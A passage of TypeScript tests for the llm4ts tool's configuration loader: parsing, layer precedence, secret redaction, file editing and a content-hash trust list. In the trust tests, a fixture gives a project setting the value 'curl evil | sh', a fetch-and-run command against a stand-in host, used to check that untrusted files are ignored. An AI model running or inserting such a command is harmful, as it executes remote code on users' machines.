import { assert, describe, it } from "@effect/vitest"
import * as Effect from "effect/Effect"
import * as Result from "effect/Result"
import { PersistenceError } from "@llm4ts/flow/FlowError"
import { makeMemoryPlainFileStore, type PlainFileStoreShape } from "@llm4ts/flow/Persistence"
import type { Environment } from "@llm4ts/flow/Settings"
import {
  editConfigText,
  expandPath,
  flowEnvironment,
  globalConfigPath,
  launchProblems,
  loadConfig,
  missingRequired,
  parseConfigFile,
  planSet,
  prepareLaunch,
  projectConfigPath,
  registryFacts,
  resolveConfig,
  writeConfig,
  type ConfigProblem,
  type FlagAssignment,
  type Resolution
} from "@llm4ts/shell/Config"
import { configTrustPath, contentHash } from "@llm4ts/shell/ConfigTrust"

const repo = "/work/app"
const home = "/home/u"
const projectPath = projectConfigPath(repo)
const globalPath = globalConfigPath({ HOME: home })
const trustPath = configTrustPath({ HOME: home })

/** The trust list after the user accepted `text` as the project file of each repository. */
const trusting = (records: Readonly<Record<string, string>>): Readonly<Record<string, string>> => ({
  [trustPath]: JSON.stringify(
    Object.fromEntries(Object.entries(records).map(([at, text]) => [at, contentHash(text)]))
  )
})

/** `files`, with the project file of `repo` trusted as it stands. */
const trusted = (files: Readonly<Record<string, string>>): Readonly<Record<string, string>> => {
  const project = files[projectPath]
  return project === undefined ? files : { ...files, ...trusting({ [repo]: project }) }
}

const resolve = (layers: {
  readonly flags?: ReadonlyArray<FlagAssignment>
  readonly environment?: Environment
  readonly project?: string
  readonly global?: string
}): Resolution =>
  resolveConfig({
    facts: registryFacts,
    flags: layers.flags ?? [],
    environment: layers.environment ?? {},
    project:
      layers.project === undefined ? undefined : parseConfigFile(layers.project, projectPath),
    global: layers.global === undefined ? undefined : parseConfigFile(layers.global, globalPath),
    repo,
    home
  })

const set = (name: string, value: string, flag = "--set"): FlagAssignment => ({ name, value, flag })

const brief = (problems: ReadonlyArray<ConfigProblem>): ReadonlyArray<string> =>
  problems.map((problem) => `${problem.severity} ${problem.kind} ${problem.name ?? ""}`.trim())

const edited = (text: string, changes: Parameters<typeof editConfigText>[1]): string => {
  const result = editConfigText(text, changes)
  assert.isTrue(Result.isSuccess(result))
  return Result.isSuccess(result) ? result.success : ""
}

describe("config paths", () => {
  it("the global file sits beside the roster, under XDG_CONFIG_HOME when set", () => {
    assert.strictEqual(globalConfigPath({ HOME: home }), "/home/u/.config/llm4ts/config.env")
    assert.strictEqual(
      globalConfigPath({ HOME: home, XDG_CONFIG_HOME: "/xdg" }),
      "/xdg/llm4ts/config.env"
    )
  })

  it("the project file is local to the clone", () => {
    assert.strictEqual(projectConfigPath(repo), "/work/app/.llm4ts/config.env")
  })
})

describe("parseConfigFile", () => {
  const entries: ReadonlyArray<readonly [form: string, line: string, name: string, value: string]> =
    [
      ["unquoted", "LLM4TS_CODER=pi", "LLM4TS_CODER", "pi"],
      ["export prefix", "export LLM4TS_CODER=pi", "LLM4TS_CODER", "pi"],
      ["indented", "  LLM4TS_CODER=pi  ", "LLM4TS_CODER", "pi"],
      ["empty", "LLM4TS_GATES=", "LLM4TS_GATES", ""],
      [
        "unquoted with spaces",
        "LLM4TS_GATES=pnpm test; pnpm lint",
        "LLM4TS_GATES",
        "pnpm test; pnpm lint"
      ],
      ["inline comment", "LLM4TS_CODER=pi # the fast one", "LLM4TS_CODER", "pi"],
      ["hash inside a word", "LLM4TS_CODER=a#b", "LLM4TS_CODER", "a#b"],
      ["only a comment as value", "LLM4TS_CODER= # none", "LLM4TS_CODER", ""],
      ["double quoted", 'LLM4TS_GATES="pnpm test # all"', "LLM4TS_GATES", "pnpm test # all"],
      ["single quoted", `LLM4TS_GATES='echo "hi"'`, "LLM4TS_GATES", 'echo "hi"'],
      ["quoted then comment", 'LLM4TS_CODER="pi" # why', "LLM4TS_CODER", "pi"],
      ["quoted keeps edge spaces", 'LLM4TS_CODER=" pi "', "LLM4TS_CODER", " pi "],
      ["no interpolation", "LLM4TS_PACK=$HOME/pack", "LLM4TS_PACK", "$HOME/pack"],
      ["no escapes", "LLM4TS_PACK=a\\nb", "LLM4TS_PACK", "a\\nb"],
      ["a quote inside a word", "LLM4TS_PACK=it's", "LLM4TS_PACK", "it's"],
      ["windows line ending", "LLM4TS_CODER=pi\r", "LLM4TS_CODER", "pi"]
    ]
  for (const [form, line, name, value] of entries) {
    it(`reads an entry: ${form}`, () => {
      const file = parseConfigFile(`${line}\n`, "/f")
      assert.deepStrictEqual(file.lines, [{ _tag: "Entry", line: 1, name, value }])
      assert.deepStrictEqual(file.problems, [])
    })
  }

  const malformed: ReadonlyArray<readonly [form: string, line: string]> = [
    ["no equals sign", "LLM4TS_CODER pi"],
    ["space before =", "LLM4TS_CODER =pi"],
    ["a name that starts with a digit", "4TS=pi"],
    ["unclosed double quote", 'LLM4TS_CODER="pi'],
    ["unclosed single quote", "LLM4TS_CODER='pi"],
    ["text after the closing quote", 'LLM4TS_CODER="pi"x'],
    ["two quoted parts", 'LLM4TS_CODER="a" "b"'],
    ["export alone", "export"],
    ["a shell command", "source ~/.profile"]
  ]
  for (const [form, line] of malformed) {
    it(`refuses a malformed line: ${form}`, () => {
      const file = parseConfigFile(`# ok\n${line}\n`, "/f")
      assert.deepStrictEqual(file.lines, [
        { _tag: "Other", line: 1 },
        { _tag: "Malformed", line: 2 }
      ])
      assert.deepStrictEqual(file.problems, [
        { severity: "error", kind: "malformed", message: "/f:2: not a NAME=value line" }
      ])
    })
  }

  it("keeps line numbers across blanks and comments, with or without a final newline", () => {
    const text = "# seats\n\nLLM4TS_CODER=pi\n   # indented comment\nLLM4TS_REASONER=claude"
    assert.deepStrictEqual(parseConfigFile(text, "/f").lines, [
      { _tag: "Other", line: 1 },
      { _tag: "Other", line: 2 },
      { _tag: "Entry", line: 3, name: "LLM4TS_CODER", value: "pi" },
      { _tag: "Other", line: 4 },
      { _tag: "Entry", line: 5, name: "LLM4TS_REASONER", value: "claude" }
    ])
    assert.deepStrictEqual(parseConfigFile("", "/f").lines, [])
  })
})

describe("resolveConfig: precedence", () => {
  const layerValues = {
    flag: "codex",
    environment: "gemini",
    project: "pi",
    global: "grok"
  } as const
  const order = ["flag", "environment", "project", "global"] as const

  for (let mask = 0; mask < 16; mask++) {
    const present = order.filter((_, index) => (mask & (1 << index)) !== 0)
    it(`layers set: ${present.length === 0 ? "none" : present.join(", ")}`, () => {
      const has = (layer: (typeof order)[number]): boolean => present.includes(layer)
      const resolution = resolve({
        ...(has("flag") ? { flags: [set("LLM4TS_CODER", layerValues.flag)] } : {}),
        ...(has("environment") ? { environment: { LLM4TS_CODER: layerValues.environment } } : {}),
        ...(has("project") ? { project: `LLM4TS_CODER=${layerValues.project}\n` } : {}),
        ...(has("global") ? { global: `LLM4TS_CODER=${layerValues.global}\n` } : {})
      })
      const coder = resolution.settings.get("LLM4TS_CODER")
      const [winner, ...below] = present
      if (winner === undefined) {
        assert.isUndefined(coder)
        return
      }
      assert.strictEqual(coder?.raw, layerValues[winner])
      assert.strictEqual(coder?.source.layer, winner)
      assert.deepStrictEqual(
        coder?.shadowed.map((layer) => [layer.source.layer, layer.raw]),
        below.map((layer) => [layer, layerValues[layer]])
      )
      assert.isFalse(resolution.problems.some((problem) => problem.severity !== "note"))
    })
  }

  it("a file value says where its line is; a flag says which flag", () => {
    const resolution = resolve({
      flags: [set("LLM4TS_PACK", "soap-ace", "--pack")],
      project: "# seats\nLLM4TS_CODER=pi\n"
    })
    assert.deepStrictEqual(resolution.settings.get("LLM4TS_CODER")?.source, {
      layer: "project",
      path: projectPath,
      line: 2
    })
    assert.deepStrictEqual(resolution.settings.get("LLM4TS_PACK")?.source, {
      layer: "flag",
      flag: "--pack"
    })
  })

  it("an environment value over a different file value is a note; over the same value, nothing", () => {
    const differs = resolve({
      environment: { LLM4TS_CODER: "codex", LLM4TS_ISOLATED: "true" },
      project: "LLM4TS_CODER=pi\nLLM4TS_ISOLATED=on\n",
      global: "LLM4TS_CODER=codex\n"
    })
    assert.deepStrictEqual(differs.problems, [
      {
        severity: "note",
        kind: "shadowed",
        message: `LLM4TS_CODER from the environment overrides ${projectPath}:1`,
        name: "LLM4TS_CODER",
        source: { layer: "project", path: projectPath, line: 1 }
      }
    ])
    assert.deepStrictEqual(
      resolve({ flags: [set("LLM4TS_CODER", "codex")], project: "LLM4TS_CODER=pi\n" }).problems,
      []
    )
  })

  it("the same setting from two flags is an error and neither wins", () => {
    const resolution = resolve({
      flags: [set("LLM4TS_PACK", "a", "--pack"), set("LLM4TS_PACK", "b")],
      project: "LLM4TS_PACK=c\n"
    })
    assert.deepStrictEqual(brief(resolution.problems), ["error conflict LLM4TS_PACK"])
    assert.strictEqual(
      resolution.problems[0]?.message,
      "LLM4TS_PACK is set by --pack and --set; use one"
    )
    assert.strictEqual(resolution.settings.get("LLM4TS_PACK")?.raw, "c")
  })
})

describe("resolveConfig: empty values", () => {
  it("an empty export does not shadow a file", () => {
    const resolution = resolve({
      environment: { LLM4TS_CODER: "", LLM4TS_REASONER: "  " },
      project: "LLM4TS_CODER=pi\nLLM4TS_REASONER=claude\n"
    })
    assert.strictEqual(resolution.settings.get("LLM4TS_CODER")?.source.layer, "project")
    assert.strictEqual(resolution.settings.get("LLM4TS_REASONER")?.raw, "claude")
    assert.deepStrictEqual(resolution.problems, [])
  })

  it("an empty file line and an empty flag leave the setting unset", () => {
    const resolution = resolve({ flags: [set("LLM4TS_PACK", "")], project: "LLM4TS_CODER=\n" })
    assert.strictEqual(resolution.settings.size, 0)
    assert.deepStrictEqual(resolution.problems, [])
  })

  it("empty is a value where the grammar says so", () => {
    const resolution = resolve({
      environment: { LLM4TS_WORKTREE_SETUP: "" },
      project: "LLM4TS_WORKTREE_SETUP=pnpm install\n",
      global: "LLM4TS_GATES=\n"
    })
    const setup = resolution.settings.get("LLM4TS_WORKTREE_SETUP")
    assert.strictEqual(setup?.raw, "")
    assert.strictEqual(setup?.source.layer, "environment")
    assert.isFalse(resolution.settings.has("LLM4TS_GATES"))
  })
})

describe("resolveConfig: paths", () => {
  it("expandPath: ~, ~/, relative and absolute", () => {
    assert.strictEqual(expandPath("~", repo, home), home)
    assert.strictEqual(expandPath("~/legacy", repo, home), "/home/u/legacy")
    assert.strictEqual(expandPath("../legacy", repo, home), "/work/legacy")
    assert.strictEqual(expandPath("/srv/legacy", repo, home), "/srv/legacy")
  })

  it("a project file path resolves against the repository, a global one against home", () => {
    const resolution = resolve({
      project: "LLM4TS_LEGACY_REPO=../legacy\nLLM4TS_TARGET_REPO=~/target\n",
      global: "LLM4TS_WORKTREE_ROOT=trees\n"
    })
    assert.strictEqual(resolution.settings.get("LLM4TS_LEGACY_REPO")?.raw, "/work/legacy")
    assert.strictEqual(resolution.settings.get("LLM4TS_TARGET_REPO")?.raw, "/home/u/target")
    assert.strictEqual(resolution.settings.get("LLM4TS_WORKTREE_ROOT")?.raw, "/home/u/trees")
  })

  it("environment and flag paths pass through; a setting that is no path is left alone", () => {
    const resolution = resolve({
      flags: [set("LLM4TS_TARGET_REPO", "~/target")],
      environment: { LLM4TS_LEGACY_REPO: "../legacy" },
      project: "LLM4TS_APP_DIR=frontend\n"
    })
    assert.strictEqual(resolution.settings.get("LLM4TS_LEGACY_REPO")?.raw, "../legacy")
    assert.strictEqual(resolution.settings.get("LLM4TS_TARGET_REPO")?.raw, "~/target")
    assert.strictEqual(resolution.settings.get("LLM4TS_APP_DIR")?.raw, "frontend")
  })
})

describe("resolveConfig: problems", () => {
  it("a name twice in one file is a warning and the last line wins", () => {
    const resolution = resolve({ project: "LLM4TS_CODER=pi\nLLM4TS_CODER=codex\n" })
    assert.strictEqual(resolution.settings.get("LLM4TS_CODER")?.raw, "codex")
    assert.deepStrictEqual(
      resolution.problems.map((problem) => [problem.severity, problem.message]),
      [["warning", `${projectPath}:1: LLM4TS_CODER is set again on line 2; the last line wins`]]
    )
  })

  it("a malformed file line is an error naming path:line", () => {
    const resolution = resolve({ global: "LLM4TS_CODER=pi\nnonsense here\n" })
    assert.deepStrictEqual(
      resolution.problems.map((problem) => [problem.severity, problem.message]),
      [["error", `${globalPath}:2: not a NAME=value line`]]
    )
    assert.strictEqual(resolution.settings.get("LLM4TS_CODER")?.raw, "pi")
  })

  it("run, secret and internal settings in a file are warnings and ignored", () => {
    const resolution = resolve({
      project: "LLM4TS_WAVE=2\nLLM4TS_MCP_TOKEN=hunter2\nLLM4TS_FLOW=epic-stories\n"
    })
    assert.strictEqual(resolution.settings.size, 0)
    assert.deepStrictEqual(
      resolution.problems.map((problem) => [problem.severity, problem.kind, problem.message]),
      [
        [
          "warning",
          "misplaced",
          `${projectPath}:1: LLM4TS_WAVE is set per run and is ignored in a file; use --set LLM4TS_WAVE=<value>`
        ],
        [
          "warning",
          "misplaced",
          `${projectPath}:2: LLM4TS_MCP_TOKEN is a secret and is ignored in a file; export it in the environment`
        ],
        [
          "warning",
          "misplaced",
          `${projectPath}:3: LLM4TS_FLOW is set by llm4ts and is ignored in a file`
        ]
      ]
    )
  })

  it("a secret or internal setting from a flag is an error; a run setting is welcome", () => {
    const resolution = resolve({
      flags: [
        set("LLM4TS_MCP_TOKEN", "hunter2"),
        set("LLM4TS_RUN_ID", "r1"),
        set("LLM4TS_WAVE", "2")
      ]
    })
    assert.deepStrictEqual(brief(resolution.problems), [
      "error misplaced LLM4TS_MCP_TOKEN",
      "error misplaced LLM4TS_RUN_ID"
    ])
    assert.deepStrictEqual([...resolution.settings.keys()], ["LLM4TS_WAVE"])
  })

  it("the environment may carry every scope", () => {
    const resolution = resolve({
      environment: { LLM4TS_WAVE: "2", LLM4TS_MCP_TOKEN: "hunter2", LLM4TS_FLOW: "hello" }
    })
    assert.deepStrictEqual(resolution.problems, [])
    assert.strictEqual(resolution.settings.size, 3)
    assert.isTrue(resolution.settings.get("LLM4TS_MCP_TOKEN")?.secret)
    assert.isFalse(resolution.settings.get("LLM4TS_WAVE")?.secret)
  })

  it("a value the grammar does not read is an error from every layer; the environment's stays shown", () => {
    const resolution = resolve({
      flags: [set("LLM4TS_VERBOSITY", "loud", "--verbose")],
      environment: { LLM4TS_JUDGE_ROUNDS: "many" },
      project: "LLM4TS_JUDGE_ROUNDS=3\nLLM4TS_ISOLATED=maybe\n"
    })
    assert.deepStrictEqual(
      resolution.problems
        .filter((problem) => problem.kind === "unreadable")
        .map((problem) => [problem.severity, problem.message]),
      [
        ["error", "--verbose: LLM4TS_VERBOSITY must be quiet, normal, verbose or debug"],
        [
          "error",
          "the environment: LLM4TS_JUDGE_ROUNDS must be a positive integer; fix or unset it"
        ],
        ["error", `${projectPath}:2: LLM4TS_ISOLATED must be on or off`]
      ]
    )
    assert.isFalse(resolution.settings.has("LLM4TS_VERBOSITY"))
    assert.isFalse(resolution.settings.has("LLM4TS_ISOLATED"))
    const rounds = resolution.settings.get("LLM4TS_JUDGE_ROUNDS")
    assert.strictEqual(rounds?.source.layer, "environment")
    assert.strictEqual(rounds?.raw, "many")
  })

  it("an unknown name: error from a flag, warning from a file, each with the closest name", () => {
    const resolution = resolve({
      flags: [set("LLM4TS_CODR", "pi")],
      project: "LLM4TS_REPO_LEGACY=/legacy\nLLM4TS_MY_OWN_FLOW_KNOB=1\nEDITOR=vi\n"
    })
    assert.deepStrictEqual(
      resolution.problems.map((problem) => [problem.severity, problem.message, problem.closest]),
      [
        ["error", "--set: unknown setting LLM4TS_CODR; did you mean LLM4TS_CODER?", "LLM4TS_CODER"],
        [
          "warning",
          `${projectPath}:1: unknown setting LLM4TS_REPO_LEGACY; did you mean LLM4TS_LEGACY_REPO?; ignored`,
          "LLM4TS_LEGACY_REPO"
        ],
        [
          "warning",
          `${projectPath}:2: unknown setting LLM4TS_MY_OWN_FLOW_KNOB; ignored`,
          undefined
        ],
        ["warning", `${projectPath}:3: unknown setting EDITOR; ignored`, undefined]
      ]
    )
    assert.strictEqual(resolution.settings.size, 0)
  })

  it("an unknown environment name: a warning when a known name is close, else a plain note", () => {
    const resolution = resolve({
      environment: { LLM4TS_CODR: "pi", LLM4TS_MY_OWN_FLOW_KNOB: "1", EDITOR: "vi" }
    })
    assert.deepStrictEqual(
      resolution.problems.map((problem) => [problem.severity, problem.message, problem.closest]),
      [
        [
          "warning",
          "the environment: unknown setting LLM4TS_CODR; did you mean LLM4TS_CODER?",
          "LLM4TS_CODER"
        ],
        ["note", "the environment: unknown setting LLM4TS_MY_OWN_FLOW_KNOB", undefined]
      ]
    )
  })

  it("no message carries a value, a secret's least of all", () => {
    const secret = "hunter2-s3cret"
    const resolution = resolve({
      flags: [
        set("LLM4TS_MCP_TOKEN", secret),
        set("LLM4TS_GEMINI_BRIDGE_TOKN", secret),
        set("LLM4TS_JUDGE_ROUNDS", secret)
      ],
      environment: {
        LLM4TS_GEMINI_BRIDGE_TOKEN: secret,
        LLM4TS_MCP_TOKN: secret,
        LLM4TS_JUDGE_ROUNDS: secret
      },
      project: `LLM4TS_MCP_TOKEN=${secret}\nLLM4TS_MCP_TOKEN = ${secret}\nLLM4TS_ISOLATED=${secret}\n`,
      global: `LLM4TS_GEMINI_BRIDGE_TOKEN=${secret}\nLLM4TS_GEMINI_BRIDGE_TOKEN=${secret}\n`
    })
    assert.isAbove(resolution.problems.length, 8)
    for (const problem of resolution.problems) {
      assert.notInclude(problem.message, secret)
    }
    assert.isTrue(resolution.settings.get("LLM4TS_GEMINI_BRIDGE_TOKEN")?.secret)
  })
})

describe("flowEnvironment", () => {
  const toggles = registryFacts.filter(
    (fact) => fact.grammar === "on or off" && (fact.scope === "global" || fact.scope === "project")
  )

  it("the registry has toggles to prove this on", () => {
    assert.isAbove(toggles.length, 10)
  })

  for (const [written, wire] of [
    ["on", "1"],
    ["TRUE", "1"],
    ["yes", "1"],
    ["1", "1"],
    ["off", "off"],
    ["0", "off"],
    ["No", "off"],
    ["false", "off"]
  ] as const) {
    it(`every toggle written ${written} in a file or a flag reaches the child as ${wire}`, () => {
      const fromFile = resolve({
        project: toggles.map((fact) => `${fact.name}=${written}`).join("\n")
      })
      const fromFlag = resolve({ flags: toggles.map((fact) => set(fact.name, written)) })
      for (const resolution of [fromFile, fromFlag]) {
        assert.deepStrictEqual(resolution.problems, [])
        const child = flowEnvironment(resolution, {})
        assert.deepStrictEqual(
          toggles.map((fact) => child[fact.name]),
          toggles.map(() => wire)
        )
      }
    })
  }

  it("an environment value is never rewritten, toggle or not", () => {
    const base: Environment = {
      LLM4TS_ISOLATED: "yes",
      LLM4TS_NODE_CHECK: "0",
      LLM4TS_JUDGE_ROUNDS: "many"
    }
    const child = flowEnvironment(
      resolve({ environment: base, project: "LLM4TS_ISOLATED=off\nLLM4TS_JUDGE_ROUNDS=3\n" }),
      base
    )
    assert.deepStrictEqual({ ...child }, base)
  })

  it("base, plus file and flag values, with paths absolute and other values verbatim", () => {
    const base = { PATH: "/bin", LLM4TS_CODER: "codex", LLM4TS_REASONER: "" }
    const child = flowEnvironment(
      resolve({
        flags: [set("LLM4TS_PACK", "soap-ace", "--pack")],
        environment: base,
        project:
          "LLM4TS_CODER=pi\nLLM4TS_LEGACY_REPO=../legacy\nLLM4TS_GATES='pnpm test; pnpm lint'\n",
        global: "LLM4TS_REASONER=claude\nLLM4TS_VERBOSITY=Verbose\n"
      }),
      base
    )
    assert.deepStrictEqual(
      { ...child },
      {
        PATH: "/bin",
        LLM4TS_CODER: "codex",
        LLM4TS_REASONER: "claude",
        LLM4TS_PACK: "soap-ace",
        LLM4TS_LEGACY_REPO: "/work/legacy",
        LLM4TS_GATES: "pnpm test; pnpm lint",
        LLM4TS_VERBOSITY: "Verbose"
      }
    )
  })

  it("a default is never projected", () => {
    const child = flowEnvironment(resolve({}), { PATH: "/bin" })
    assert.deepStrictEqual({ ...child }, { PATH: "/bin" })
  })

  it("shellOnly settings are stripped; extra is laid on top", () => {
    const base = {
      LLM4TS_MCP_TOKEN: "hunter2",
      LLM4TS_GEMINI_BRIDGE_TOKEN: "t",
      LLM4TS_FLOW: "old"
    }
    const child = flowEnvironment(resolve({ environment: base }), base, {
      LLM4TS_FLOW: "epic-stories",
      LLM4TS_RUN_ID: "r1"
    })
    assert.deepStrictEqual(
      { ...child },
      { LLM4TS_GEMINI_BRIDGE_TOKEN: "t", LLM4TS_FLOW: "epic-stories", LLM4TS_RUN_ID: "r1" }
    )
  })
})

describe("missingRequired", () => {
  const names = (resolution: Resolution, flow: string): ReadonlyArray<string> =>
    missingRequired(resolution, flow).map((fact) => fact.name)

  it("names the settings a flow cannot start without", () => {
    assert.deepStrictEqual(names(resolve({}), "convert-page"), ["LLM4TS_LEGACY_REPO"])
    assert.deepStrictEqual(names(resolve({}), "hello"), [])
  })

  it("any layer satisfies it; an empty value does not", () => {
    assert.deepStrictEqual(
      names(resolve({ global: "LLM4TS_LEGACY_REPO=~/legacy\n" }), "convert-page"),
      []
    )
    assert.deepStrictEqual(
      names(resolve({ environment: { LLM4TS_LEGACY_REPO: "/legacy" } }), "convert-page"),
      []
    )
    assert.deepStrictEqual(
      names(resolve({ environment: { LLM4TS_LEGACY_REPO: "" } }), "convert-page"),
      ["LLM4TS_LEGACY_REPO"]
    )
  })
})

describe("editConfigText", () => {
  const original = [
    "# seats",
    "export LLM4TS_CODER=pi # the fast one",
    "",
    "this line is nonsense",
    "  LLM4TS_REASONER=claude",
    ""
  ].join("\n")

  it("sets in place, keeping export, indentation, comments, order and unknown lines", () => {
    assert.strictEqual(
      edited(original, [
        { name: "LLM4TS_CODER", value: "codex" },
        { name: "LLM4TS_REASONER", value: "gemini" }
      ]),
      [
        "# seats",
        "export LLM4TS_CODER=codex # the fast one",
        "",
        "this line is nonsense",
        "  LLM4TS_REASONER=gemini",
        ""
      ].join("\n")
    )
  })

  it("appends a new name, to an empty text and to one without a final newline", () => {
    assert.strictEqual(
      edited(original, [{ name: "LLM4TS_PACK", value: "soap-ace" }]),
      `${original}LLM4TS_PACK=soap-ace\n`
    )
    assert.strictEqual(edited("", [{ name: "LLM4TS_CODER", value: "pi" }]), "LLM4TS_CODER=pi\n")
    assert.strictEqual(
      edited("# note", [{ name: "LLM4TS_CODER", value: "pi" }]),
      "# note\nLLM4TS_CODER=pi\n"
    )
  })

  it("setting the current value returns the same text; a second run changes nothing", () => {
    assert.strictEqual(edited(original, [{ name: "LLM4TS_CODER", value: "pi" }]), original)
    const changes = [
      { name: "LLM4TS_CODER", value: "codex" },
      { name: "LLM4TS_GATES", value: "pnpm test # all" },
      { name: "LLM4TS_REASONER", value: undefined }
    ]
    const once = edited(original, changes)
    assert.notStrictEqual(once, original)
    assert.strictEqual(edited(once, changes), once)
  })

  it("removes every line of a name; removing an absent name changes nothing", () => {
    assert.strictEqual(
      edited("LLM4TS_CODER=pi\n# keep\nLLM4TS_CODER=codex\n", [
        { name: "LLM4TS_CODER", value: undefined }
      ]),
      "# keep\n"
    )
    assert.strictEqual(edited(original, [{ name: "LLM4TS_PACK", value: undefined }]), original)
  })

  it("with a name on two lines, sets the one that wins", () => {
    assert.strictEqual(
      edited("LLM4TS_CODER=pi\nLLM4TS_CODER=codex\n", [{ name: "LLM4TS_CODER", value: "claude" }]),
      "LLM4TS_CODER=pi\nLLM4TS_CODER=claude\n"
    )
  })

  const quoting: ReadonlyArray<readonly [value: string, written: string]> = [
    ["pi", "pi"],
    ["", ""],
    ["a=b;c", "a=b;c"],
    ["it's", "it's"],
    ["pnpm test", '"pnpm test"'],
    ["a#b", '"a#b"'],
    ["'quoted", `"'quoted"`],
    ["pnpm run 'x y'", `"pnpm run 'x y'"`],
    ['echo "hi"', `'echo "hi"'`],
    ['"', `'"'`]
  ]
  for (const [value, written] of quoting) {
    it(`writes ${JSON.stringify(value)} as ${written} and reads it back`, () => {
      const text = edited("", [{ name: "LLM4TS_GATES", value }])
      assert.strictEqual(text, `LLM4TS_GATES=${written}\n`)
      assert.deepStrictEqual(parseConfigFile(text, "/f").lines, [
        { _tag: "Entry", line: 1, name: "LLM4TS_GATES", value }
      ])
    })
  }

  it("refuses a value with both quote kinds or a line break, without repeating it", () => {
    assert.deepStrictEqual(
      editConfigText(original, [{ name: "LLM4TS_GATES", value: `echo "it's"` }]),
      Result.fail(`LLM4TS_GATES: a value cannot hold both ' and "`)
    )
    assert.deepStrictEqual(
      editConfigText(original, [{ name: "LLM4TS_GATES", value: "a\nb" }]),
      Result.fail("LLM4TS_GATES: a value cannot span lines")
    )
  })
})

describe("planSet", () => {
  it("routes a global setting to the global file and a project setting to the project file", () => {
    assert.deepStrictEqual(
      planSet(registryFacts, [
        { name: "LLM4TS_CODER", value: "pi" },
        { name: "LLM4TS_JUDGE_ROUNDS", value: "4" },
        { name: "LLM4TS_WORKTREE_SETUP", value: "" }
      ]),
      Result.succeed([
        { name: "LLM4TS_CODER", value: "pi", target: "global" },
        { name: "LLM4TS_JUDGE_ROUNDS", value: "4", target: "project" },
        { name: "LLM4TS_WORKTREE_SETUP", value: "", target: "project" }
      ])
    )
  })

  it("a forced target takes both", () => {
    const pairs = [
      { name: "LLM4TS_CODER", value: "pi" },
      { name: "LLM4TS_JUDGE_ROUNDS", value: "4" }
    ] as const
    for (const target of ["project", "global"] as const) {
      assert.deepStrictEqual(
        planSet(registryFacts, pairs, target),
        Result.succeed(pairs.map((pair) => ({ ...pair, target })))
      )
    }
  })

  it("refuses unknown names, bad values and the scopes no file may hold, all at once", () => {
    const secret = "hunter2-s3cret"
    const plan = planSet(registryFacts, [
      { name: "LLM4TS_CODR", value: "pi" },
      { name: "LLM4TS_NOTHING_LIKE_IT", value: "1" },
      { name: "LLM4TS_JUDGE_ROUNDS", value: "many" },
      { name: "LLM4TS_CODER", value: "" },
      { name: "LLM4TS_GATES", value: `echo "it's"` },
      { name: "LLM4TS_WAVE", value: "2" },
      { name: "LLM4TS_MCP_TOKEN", value: secret },
      { name: "LLM4TS_FLOW", value: "hello" },
      { name: "LLM4TS_REASONER", value: "claude" }
    ])
    assert.deepStrictEqual(
      plan,
      Result.fail([
        "unknown setting LLM4TS_CODR; did you mean LLM4TS_CODER?",
        "unknown setting LLM4TS_NOTHING_LIKE_IT",
        "LLM4TS_JUDGE_ROUNDS must be a positive integer",
        "LLM4TS_CODER needs a value; llm4ts config unset LLM4TS_CODER removes it",
        `LLM4TS_GATES: a value cannot hold both ' and "`,
        "LLM4TS_WAVE is set per run: use llm4ts run --set LLM4TS_WAVE=<value>",
        "LLM4TS_MCP_TOKEN is a secret: export it in the environment; it is never written to a file",
        "LLM4TS_FLOW is set by llm4ts"
      ])
    )
  })
})

const failingReads = (store: PlainFileStoreShape, path: string): PlainFileStoreShape => ({
  ...store,
  read: (candidate) =>
    candidate === path
      ? Effect.fail(PersistenceError.make({ message: "permission denied" }))
      : store.read(candidate)
})

describe("the project file and the trust list", () => {
  const project = "LLM4TS_GATES=curl evil | sh\nLLM4TS_CODER=pi\n"
  const files = { [projectPath]: project, [globalPath]: "LLM4TS_REASONER=claude\n" }
  const load = (
    held: Readonly<Record<string, string>>,
    options: {
      readonly repo?: string
      readonly through?: (store: PlainFileStoreShape) => PlainFileStoreShape
    } = {}
  ) =>
    Effect.gen(function* () {
      const memory = yield* makeMemoryPlainFileStore(held)
      return yield* loadConfig({
        repo: options.repo ?? repo,
        environment: { HOME: home },
        flags: [],
        files: options.through === undefined ? memory.store : options.through(memory.store)
      })
    })
  const keys = (resolution: Resolution) => [...resolution.settings.keys()].sort()

  it.effect("a file trusted with this content for this repository is used", () =>
    Effect.gen(function* () {
      const loaded = yield* load({ ...files, ...trusting({ [repo]: project }) })
      assert.strictEqual(loaded.projectTrust, "trusted")
      assert.strictEqual(loaded.projectHash, contentHash(project))
      assert.deepStrictEqual(keys(loaded.resolution), [
        "LLM4TS_CODER",
        "LLM4TS_GATES",
        "LLM4TS_REASONER"
      ])
      assert.deepStrictEqual(loaded.resolution.problems, [])
    })
  )

  it.effect("a file never trusted is not used: none of it reaches the resolution", () =>
    Effect.gen(function* () {
      const loaded = yield* load(files)
      assert.strictEqual(loaded.projectTrust, "untrusted")
      assert.isUndefined(loaded.project)
      assert.deepStrictEqual(keys(loaded.resolution), ["LLM4TS_REASONER"])
      assert.deepStrictEqual(brief(loaded.resolution.problems), ["warning untrusted"])
      assert.strictEqual(
        loaded.resolution.problems[0]?.message,
        `${projectPath} is new and not trusted, so llm4ts did not read it. Review and accept it: llm4ts config trust --repo ${repo}`
      )
      assert.deepStrictEqual(launchProblems(loaded.resolution).blocking, [])
    })
  )

  it.effect("a file that changed after it was trusted is not used", () =>
    Effect.gen(function* () {
      const loaded = yield* load({
        ...files,
        ...trusting({ [repo]: "LLM4TS_CODER=pi\n" })
      })
      assert.strictEqual(loaded.projectTrust, "changed")
      assert.isUndefined(loaded.project)
      assert.deepStrictEqual(keys(loaded.resolution), ["LLM4TS_REASONER"])
      assert.deepStrictEqual(
        loaded.resolution.problems.map((problem) => problem.message),
        [
          `${projectPath} has changed since it was trusted, so llm4ts did not read it. Review and accept it: llm4ts config trust --repo ${repo}`
        ]
      )
    })
  )

  it.effect("an unknown line in an untrusted file is not even reported: it was not read", () =>
    Effect.gen(function* () {
      const loaded = yield* load({ [projectPath]: "oops\nLLM4TS_JUDGE_ROUND=1\n" })
      assert.deepStrictEqual(brief(loaded.resolution.problems), ["warning untrusted"])
    })
  )

  for (const [label, store] of [
    ["not JSON", "{ nope"],
    ["JSON of another shape", JSON.stringify({ [repo]: 7 })],
    ["a list", JSON.stringify([contentHash(project)])]
  ] as const) {
    it.effect(`a malformed trust list (${label}) trusts nothing and says so once`, () =>
      Effect.gen(function* () {
        const loaded = yield* load({ ...files, [trustPath]: store })
        assert.strictEqual(loaded.projectTrust, "untrusted")
        assert.deepStrictEqual(keys(loaded.resolution), ["LLM4TS_REASONER"])
        assert.deepStrictEqual(
